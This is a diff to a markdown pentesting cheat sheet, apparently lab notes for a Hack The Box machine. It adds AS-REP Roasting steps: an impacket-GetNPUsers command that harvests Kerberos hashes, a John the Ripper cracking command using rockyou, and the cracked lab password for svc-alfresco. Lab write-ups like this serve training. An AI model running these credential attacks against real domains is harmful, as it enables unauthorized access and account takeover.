@@ -200,9 +200,20 @@ rpcclient $> querygroup 0x47c
 ---
 
 ## AS-REP Roasting
-  - ``: Get users who not require Kerberos preauthentication.
+### Get Hash
+- `impacket-GetNPUsers`: Get users who not require Kerberos preauthentication.
 ```CSS
 ▶ impacket-GetNPUsers htb.local/ -dc-ip 10.10.10.161 -usersfile users.txt
 ```
 ![image](https://user-images.githubusercontent.com/83878909/231133087-8e74b0d1-716c-4184-9169-9a5236ebe78e.png)
+
+### Crack Hash
+```CSS
+▶ john --wordlist=/usr/share/wordlists/rockyou.txt krb5.hash
+```
+![image](https://user-images.githubusercontent.com/83878909/231135411-2c72d954-43c2-4657-9dce-00101633f7be.png)
+
+  - Password for service account user `svc-alfresco`: `s3rvice`
+
+---
 
